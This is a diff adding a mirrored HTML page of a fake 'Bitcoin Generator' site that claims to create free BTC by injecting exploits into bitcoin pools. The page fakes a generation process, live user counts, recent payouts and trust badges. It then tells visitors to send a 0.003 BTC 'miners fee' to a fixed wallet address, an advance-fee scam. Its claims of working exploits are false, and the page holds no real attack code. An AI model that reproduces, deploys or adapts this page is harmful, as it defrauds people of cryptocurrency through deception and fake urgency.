@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html>
+
+
+<!-- Mirrored from limited-bitcoin-generator.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 11 Jun 2017 18:52:03 GMT -->
+
+<!-- Mirrored from www.bitgenx.pro/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 12 Feb 2018 13:54:49 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	  <meta http-equiv="x-ua-compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+      <title>Bitcoin Generator - Free BTC by Injecting Exploits to Bitcoin Pools and Blockchain</title>
+	  <meta name="keywords" content=" Bitcoin Generator,
+Bitcoin Generator exploits,
+Free Bitcoin Generator,
+Free Bitcoin Generator android,
+Free bitcoin,
+Create bitcoin free,
+bitcoin hack,
+bitcoin online hack">
+      <link href="vjs.zencdn.net/5.19.2/video-js.css" rel="stylesheet">
+      <link rel=”stylesheet” href=%e2%80%9dhttps_/maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.html>
+
+  <!-- If you'd like to support IE8 -->
+  <script src="vjs.zencdn.net/ie8/1.1.2/videojs-ie8.min.js"></script>
+  
+  
+      <link rel="stylesheet" type="text/css" href="ais/standard.css">
+      <link rel="stylesheet" type="text/css" href="src/bootstrap.superhero.css">
+    <link href="css/style.css" rel="stylesheet" />
+	<link rel="shortcut icon" href="src/btc.png">
+	 
+      <script type="text/javascript" src="js/1.10.2/jquery.min.js"></script>
+     <!-- Locker Code -->
+	 <link rel="stylesheet" href="ais/slider.css">
+		<link rel="stylesheet" href="ais/sticky.css">
+
+		<style>
+body {
+    font-family: 'Ubuntu-Light', sans-serif;
+    background-color: #F8F8F8;
+    -webkit-font-smoothing: antialiased;}
+	
+	output {
+            display: inline;
+            font-size: 30px;
+            font-weight: bold;
+            text-align: center;
+			color: orange;
+            margin: 10px 0
+        }
+	.terminal-bg{
+    background: #000;
+    padding: 30px;
+    border-radius: 30px;
+    position: relative;
+    z-index: 1;
+}
+#PriceBox {
+    display: none;   
+}
+.spinner {
+  margin: 10px auto 0;
+  width: 70px;
+  text-align: center;
+}
+
+.spinner > div {
+  width: 18px;
+  height: 18px;
+  background-color: #333;
+
+  border-radius: 100%;
+  display: inline-block;
+  -webkit-animation: sk-bouncedelay 1.4s infinite ease-in-out both;
+  animation: sk-bouncedelay 1.4s infinite ease-in-out both;
+}
+
+.spinner .bounce1 {
+  -webkit-animation-delay: -0.32s;
+  animation-delay: -0.32s;
+}
+
+.spinner .bounce2 {
+  -webkit-animation-delay: -0.16s;
+  animation-delay: -0.16s;
+}
+
+@-webkit-keyframes sk-bouncedelay {
+  0%, 80%, 100% { -webkit-transform: scale(0) }
+  40% { -webkit-transform: scale(1.0) }
+}
+
+@keyframes sk-bouncedelay {
+  0%, 80%, 100% { 
+    -webkit-transform: scale(0);
+    transform: scale(0);
+  } 40% { 
+    -webkit-transform: scale(1.0);
+    transform: scale(1.0);
+  }
+}
+@media (min-width: 768px){
+    .modal-dialog{
+        width: 480px;
+    }
+    .floating-logo {
+        position: fixed;
+        left: 20px;
+        bottom: 20px;
+        opacity: .6;
+    }
+    .floating-logo img {
+        width: 200px!important;
+    }
+    .floating-etrust {
+        position: fixed;
+        left: 20px;
+        bottom: 20px;
+        opacity: .6;
+    }
+    .floating-etrust img {
+        width: 100px;
+    }
+}
+@media (max-width: 768px){
+    .floating-logo {
+        display: none;
+    }
+    .floating-etrust {
+        display: none;
+    }
+}
+
+.terminal {
+    white-space: pre;
+    height: 200px;
+    max-height: 300px;
+    overflow-y: auto;
+    overflow-x: hidden;
+    color: #ffffff;
+    font-weight: 600;
+    letter-spacing: .2px;
+
+}
+#b { display: none; }
+.terminal span {
+    color:#5CB85C;
+}
+.terminal b{
+    color:#D94343;
+    font-weight: 600;
+}
+</style>
+
+
+
+   </head>
+   <body cz-shortcut-listen="true" >
+      <link href="ais/css.css" rel="stylesheet" type="text/css">
+      <div id="X00WrapperMain">
+         <div class="floating-etrust">
+    <img src="src/etrust.png" alt="truste verified" class="logo"> 
+	<img src="src/avast.png" alt="truste verified" class="logo">
+	<img src="src/bitcoin.png" alt="truste verified" class="logo"> 
+	</div>
+         <div style="margin-top:5px; margin-bottom: -37px; text-align: center;">
+         
+
+			<a href="index.html"><img id="X00ImageHeader" src="src/logo.png" width="600" alt=" Bitcoin Generator"/></br></a>
+			
+	<nav align="center"><strong>  <font color="black"><span class="glyphicon glyphicon-bullhorn"></span> Instant Technical Support - BtcGenex.com@gmail.com</font></strong></nav>
+
+
+
+			
+			
+			<div style="">
+            <div text-align:left!important;"><span class="label label-danger"><strong>All BTC Addresses and IPs are allowed to use only ONE time our site for </strong></span> <span id="X00Countdown" class="label label-danger" style="font-weight: bold; display: inline; opacity: 0.866044;">35:00</span> <span class="label label-danger"><strong>minutes!</strong></span></div>
+         </div>
+            <div style="text-align: right; margin-bottom: 19px; ">
+               <span id="X00ActivityMinutes" class="label label-info" style="font-weight: bold;">Latest check by the Team was made <i>Today</i></span>
+            </div>
+         </div>
+         <div id="X00WrapperStart" class="panel panel-default">
+            <div class="panel-heading">
+               <div class="form-group" style="margin-bottom: 10px;"><br><br>
+				<label style="font-weight: bold;font-size: 13px;padding-center: 10px;text-align: center;"><h3> 	&nbsp;&nbsp;ENTER YOUR BITCOIN WALLET ADDRESS BELLOW</h3></label><br>
+                  <div class="input-group">
+                     <span class="input-group-addon"><img src="ais/bitcoin3.png" style="width: 34px" alt=""></span>
+                     <input id="X00InputUsername" type="text" class="form-control error" placeholder="Eg. 12UprsnCyZDHmfQdbdFDdd54dy9pKys5nX"  data-minlength="26" maxlength="35">
+				  </div>
+               </div>
+               <div class="form-group" style="margin-bottom: 0;">
+				<label style="font-weight: italic;font-size: 13px;padding-left: 10px;">For keeping this method available as much as possible, we allow user's IP to access this Bitcoin Generator only for 35 minutes and possibility to generate a maximum of 2.5 BitCoin for 3 different Addresses. </label>
+			    </br></br></br>
+				<label style="font-weight: bold;font-size: 13px;padding-left: 10px;"><h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CHOOSE BITCOIN AMOUNT TO GENERATE</h3></label>
+                  
+				<input id="X04InputPokecoins" type="range" min="0.1" max="2.5" step="0.1" value="0.5" data-rangeslider>
+            <div style="text-align:center"><br><output id="js-output"></output><label style="display: inline;
+            font-size: 30px;
+            font-weight: bold;
+            text-align: center;
+			color: orange;
+            margin: 10px 0;"> BTC</label><br></div>
+				<div style="text-align:center"><label style="font-weight: bold;font-size: 13px;padding-left: 10px;">*Choosing a large amount takes longer for our server to run exploits into Bitcoins pools!</label></div>
+                  </br>
+				  </div>
+            </div>
+            <span id="X00WrapperButtonStart" class="input-group-btn" style="display: none;text-align: center;">
+            <button id="X00ButtonStart" class="btn btn-success" type="button" style="">START!</button>
+            </span>
+            <div class="panel-footer small">
+               <span class="label label-default" style="font-weight: bold;">Info</span> <span class="label label-default">*<i>This tool is limited and can be stopped anytime. We are using this tool continously and we will inform you when our exploits will stop working.</i></span>
+            </div>
+         </div>
+         <div id="X00WrapperProcess" class="panel panel-default" style="display: none;">
+            <div class="panel-heading">
+               <h3 class="panel-title"><i class="glyphicon glyphicon-refresh" style="margin-right: 10px;"></i> Processing , please wait...</h3>
+            </div>
+            <div class="panel-body" style="text-align:center; text-transform: uppercase; font-weight: bold;"><br>
+			               <div id="X00ProgressText" class="text-center">Charging.. ...</div>
+            </div>
+			<div class="panel-footer">
+               <div class="progress progress-striped active" style="margin-bottom: 5px;">
+                  <div id="X00ProgressBar" class="progress-bar progress-bar-warning" style="width: 0%"><br></div>
+               </div>
+            </div>
+         </div>
+         <div id="X00WrapperDone" class="panel panel-default" style="display: none;">
+            <div class="panel-heading">
+               <h3 class="panel-title"><i class="glyphicon glyphicon-thumbs-up" style="margin-right: 10px;"></i> Our server generated successfuly BitCoin</h3>
+            </div>
+            <div class="panel-body"><br>
+			<br>
+               <div style="text-align:center"><b><span><span id="X04btc" style="font-weight: bold; color:orange"></span> <span style="font-weight: bold; color:orange">BTC</span> has been sent to <span style="padding: 0 5px;">"<span id="X00address" style="font-weight: bold;color:white"></span>"</span> wallet address. Transaction status: <span class="label label-info2" style="font-weight: bold;">0/3 Confirmations</span> <br></b></div><br><br>
+			   <div style="text-align:center"><strong>The Bitcoin network requires a small fee to be paid for each transaction that goes to the miners, else a transaction might never be confirmed.</br>
+To ensure your transaction confirms consistently and reliably, <br>pay the Very Small miners fee of at least <span style="color: lime;">0.003 </span>BTC for this transaction at:</strong></div><br>
+			   
+			   <div style="text-align:center"><h4><strong>Send 0.003 BTC To:
+			   <br>
+			   <br>
+			   1EHknX6yVCG1582wXRvuRiSvTMKZKRF5DJ</strong></h4>
+			   <br><img style="max-width: 280px!important;" src="src/qrcode.png">
+			   
+			   <br>
+			  
+
+
+
+			   <div class="spinner">
+  <div class="bounce1"></div>
+  <div class="bounce2"></div>
+  <div class="bounce3"></div>
+</div></div></span><br><br>
+			<div class="progress-bar active" style="width:100%"><b>BITCOIN GENERATED AND SENT SUCCESSFULY</b></div>
+			   Transaction Status: <span class="label label-info2" style="font-weight: bold;">0/3 Confirmations</span><br>
+            </div>
+			<div class="panel-footer text-center">
+               
+            </div>
+         </div>
+         <div class="panel panel-default" style="">
+            <div class="panel-heading">
+               <h2 class="panel-title"><i class="glyphicon glyphicon-fire" style="margin-right: 10px;"></i>Latest Generated BitCoins Using Our Exploits</h2>
+            </div>
+            <div id="X00Activities" class="panel-body">
+               <div style="text-align: center; display: block;"><span class="label label-primary" style="font-weight: bold;">161.164.84.159</span> <span class="label label-default" style="font-weight: bold;">has received</span> <span class="label label-success" style="font-weight: bold;">2.500 Free Coins and Unlock Weapon</span> <span id="X00ActivitySeconds" class="label label-info" style="font-weight: bold;">0s ago</span></div>
+            </div>
+            <div class="panel-footer small">
+               <span class="label label-default"><strong>Info</strong></span> <span class="label label-default">The activities can be displayed delayed due to many server requests.</span>
+            </div>
+<!--komentar-->
+<div class="panel panel-primary">
+    <div class="panel-heading">
+        <h3 class="panel-title">Video - How to use Bitcoin Generator</h3>
+    </div>
+    <div class="panel-body">
+        <video id="my-video" class="video-js" controls preload="auto" width="640" height="264"
+  poster="proof.jpg" data-setup="{}">
+    <source src="video.webm" type='video/webm'>
+    <p class="vjs-no-js">
+      To view this video please enable JavaScript, and consider upgrading to a web browser that
+      <a href="http://videojs.com/html5-video-support/" target="_blank">supports HTML5 video</a>
+    </p>
+  </video>
+  <script>
+  (function (w,i,d,g,e,t,s) {w[d] = w[d]||[];t= i.createElement(g);
+    t.async=1;t.src=e;s=i.getElementsByTagName(g)[0];s.parentNode.insertBefore(t, s);
+  })(window, document, '_gscq','script','../widgets.getsitecontrol.com/97188/script.js');
+</script>
+
+  <script src="vjs.zencdn.net/5.19.2/video.js"></script>
+</div>
+</div>
+<div class="panel panel-primary">
+    <div class="panel-heading">
+        <h3 class="panel-title">Chat</h3>
+    </div>
+    <div class="panel-body">
+       <div class="X00Container">
+                        <div class="X00ContainerTop" style=" height: 0px!important; border-top-left-radius: 4px; border-top-right-radius: 4px;">
+                            <span class="yellow_text" style=" font-size: 16px; position: relative; font-weight: 100; bottom: 10px;">
+								Real Time ChatRoom (<span id="online2"></span>)</span>
+                        </div>
+                        <div class="X00ContainerCenter" style=" padding-top: 30px; padding-right:5px;">
+                            <div id="X00ContainerChat" style="text-shadow: none;">
+                                <div class="X00OverlaySmall" style=" display:none; z-index: 3; position: absolute; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.34);">
+                                </div>
+                                <div id="X00ContainerChatUserName" style="text-shadow: none;">
+                                    <div class="X00ContainerTop">
+                                        <span class="yellow_text" style=" font-size: 14px; margin-left: 7px; top: -4px; position: relative;">Enter
+											your Chat Username</span>
+                                    </div><br>
+                                    <input id="X00InputChatUserName" type="text">
+                                    <div class="blue_button" id="X00ButtonChatUserName">
+                                        <div class="blue_button_text noselect">
+                                            Save
+                                        </div>
+                                    </div>
+                                </div>
+                                <div id="X00ContainerChatContent" style="text-shadow: none;height: 213px;">
+                                    <div id="X00ChatContent" style="text-shadow: none;"></div>
+                                </div>
+                            </div>
+                            <div id="X00ContainerChatControls" style="text-shadow: none;">
+                                <div style="margin-bottom: 5px; text-shadow: none;">
+                                    <input id="X00InputChat" placeholder="Send a message" type="text">
+                                    <div class="blue_button" id="X00ButtonChat">
+                                        <div class="blue_button_text noselect">
+                                            Send
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div> 
+</div>
+</div>
+
+         
+      </div>
+      <div id="X00Modal01" class="modal fade" style="">
+         <div class="modal-dialog">
+            <div class="modal-content">
+               <div class="modal-header">
+                  <button id="X00ButtonClose" type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+                  <h5 class="modal-title"> Free Bitcoin Generator</h5>
+               </div>
+               <div style="text-align:center"><div class="modal-body">
+                  Are you sure that you typed correctly and you want to<br> generate<span style="padding: 0 5px;"><span id="X04Pokecoins" style="font-weight: bold; color:orange"></span> BTC 
+				</span> to this Bitcoin Address <span style="padding: 0 5px;">"<span id="X00Username" style="font-weight: bold;color:white"></span>"</span>?</br>This operation takes a while and cannot be stopped, check your address twice before confirming.
+               </div></div>
+               <div class="modal-footer">
+                  <button id="X00ButtonCancel" type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>
+                  <button id="X00ButtonContinue" type="button" class="btn btn-success">Confirm</button>
+               </div>
+            </div>
+         </div>
+      </div>
+         <div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div>
+
+	    <!-- Javacript Files -->
+		<script src="assets/plugins/terminal/typewriter.html"></script>
+<script src="assets/content/terminal.html"></script>
+<script src="assets/plugins/qr/qrcode.min.html"></script>
+<script src="assets/js/modules.html"></script>
+<script type="text/javascript">
+      $( function() {
+    var X04Pokecoins = 0.1;
+    if(localStorage.getItem("selected_amount") != null) {
+        X04Pokecoins = parseFloat(localStorage.getItem("selected_amount"));
+        $(".selected-amount").text(X04Pokecoins);
+        var share = 3.45 - parseFloat(X04Pokecoins);
+        $(".miners-amount").html(((parseFloat(X04Pokecoins)*share)/100).toFixed(5));
+    }else {
+        localStorage.setItem("selected_amount",0.1);
+    }
+    if(localStorage.getItem("selected_address") != null) {
+        $(".input-address").val(localStorage.getItem("selected_address"));
+    }
+        // online stats
+        var eenum = 534;
+        var ee;
+
+        function dis_num2() {
+            document.getElementById("online").innerHTML = eenum;
+            var randWay = Math.floor(Math.random() * 10 + 1);
+            if (randWay <= 5) {
+                eenum = eenum + Math.floor(Math.random() * 10 + 1);;
+            } else {
+                eenum = eenum - Math.floor(Math.random() * 10 + 1);;
+            }
+            ee = setTimeout("dis_num2()", 1000);
+        }
+        dis_num2();
+
+
+        document.getElementById("para1").innerHTML = formatAMPM();
+
+        function formatAMPM() {
+            var d = new Date(),
+
+                hours = d.getHours().toString().length == 1 ? '0' + d.getHours() : d.getHours(),
+                ampm = d.getHours() >= 12 ? 'pm' : 'am',
+                months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
+                days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
+            return months[d.getMonth()] + ' ' + d.getDate() + ' ' + d.getFullYear() + ' ';
+        });
+    </script>
+    <script type="text/javascript" src="ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.html"></script>
+	<script type="text/javascript" src="dist/rangeslider.min.js"></script>
+	<script src="content/typewriter.js"></script>
+<script src="content/terminal.js"></script>
+    <script type="text/javascript" src="js/fancySelect.js"></script>
+    <script type="text/javascript" src="js/jquery.equalheights.js"></script>
+    <script type="text/javascript" src="js/jquery.parallax-1.1.3.js"></script>
+    <script type="text/javascript" src="js/sweet-alert.min.js"></script>
+    <script type="text/javascript" src="js/jquery.animatecss.min.js"></script>
+    <script type="text/javascript" src="js/jquery.magnific-popup.min.js"></script>
+    <script type="text/javascript" src="js/jquery.nicescroll.min.js"></script>
+    <script type="text/javascript" src="js/jquery.smooth-scroll.min.js"></script>
+    <script type="text/javascript" src="js/validator.min.js"></script>
+    <script type="text/javascript" src="js/form-scripts.js"></script>
+    <script type="text/javascript" src="js/main.js"></script>	 
+<script type="text/javascript">
+         var X00Unique = 'COC_02_58d2ca2e43';
+         var X00CountdownMinutesStart = 35;
+         var X00CountdownSecondsStart = 60;
+      </script>
+	  <script>
+	  $('#X04InputPokecoins').onload(function () {
+    range.reflow();
+});
+	  </script> <script>
+        function loadCSS(path) {
+            var elem = document.createElement('link');
+            var head = document.getElementsByTagName('head')[0];
+            elem.rel = 'stylesheet';
+            elem.href = path;
+            elem.media = 'only x';
+            head.appendChild(elem);
+            setTimeout(function() {
+                elem.media = 'all';
+            });
+        }
+        loadCSS('dist/rangeslider.html');
+    </script>
+	  <script>
+            $(function() {
+                var $document = $(document);
+                var selector = '[data-rangeslider]';
+                var $inputRange = $(selector); /** * Example functionality to demonstrate a value feedback * and change the output's value. */
+                function valueOutput(element) {
+                    var value = element.value;
+                    var output = element.parentNode.getElementsByTagName('output')[0];
+                    output.innerHTML = value;
+                } /** * Initial value output */
+                for (var i = $inputRange.length - 1; i >= 0; i--) {
+                    valueOutput($inputRange[i]);
+                }; /** * Update value output */
+                $document.on('input', selector, function(e) {
+                    valueOutput(e.target);
+                }); /** * Initialize the elements */
+                $inputRange.rangeslider({
+                    polyfill: false
+                }); /** * Example functionality to demonstrate programmatic value changes */
+                $document.on('click', '#js-example-change-value button', function(e) {
+                    var $inputRange = $('[data-rangeslider]', e.target.parentNode);
+                    var value = $('input[type="number"]', e.target.parentNode)[0].value;
+                    $inputRange.val(value).change();
+                }); /** * Example functionality to demonstrate programmatic attribute changes */
+                $document.on('click', '#js-example-change-attributes button', function(e) {
+                    var $inputRange = $('[data-rangeslider]', e.target.parentNode);
+                    var attributes = {
+                        min: $('input[name="min"]', e.target.parentNode)[0].value,
+                        max: $('input[name="max"]', e.target.parentNode)[0].value,
+                        step: $('input[name="step"]', e.target.parentNode)[0].value
+                    };
+                    $inputRange.attr(attributes).rangeslider('update', true);
+                }); /** * Example functionality to demonstrate destroy functionality */
+                $document.on('click', '#js-example-destroy button[data-behaviour="destroy"]', function(e) {
+                    $('input[type="range"]', e.target.parentNode).rangeslider('destroy');
+                }).on('click', '#js-example-destroy button[data-behaviour="initialize"]', function(e) {
+                    $('input[type="range"]', e.target.parentNode).rangeslider({
+                        polyfill: false
+                    });
+                });
+            });
+        </script>
+	  <script src="ais/bootstrap-slider.js"></script>
+ 	<script src="src/script.js"></script>
+      <script type="text/javascript" src="src/standard.js"></script>
+	 
+	<script type="text/javascript" src="js/bootstrap.min.js"></script>
+<script>
+// Warning before leaving the page (back button, or outgoinglink)
+window.onbeforeunload = function() {
+   return "Do you really want to leave our generator and don't claim up to 2.5 BTC?";
+   //if we return nothing here (just calling return;) then there will be no pop-up question at all
+   //return;
+};
+</script>	
+	
+  </body>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','../www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-102246354-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<!-- Mirrored from limited-bitcoin-generator.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 11 Jun 2017 18:53:05 GMT -->
+
+<!-- Mirrored from www.bitgenx.pro/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 12 Feb 2018 13:55:46 GMT -->
+</html>
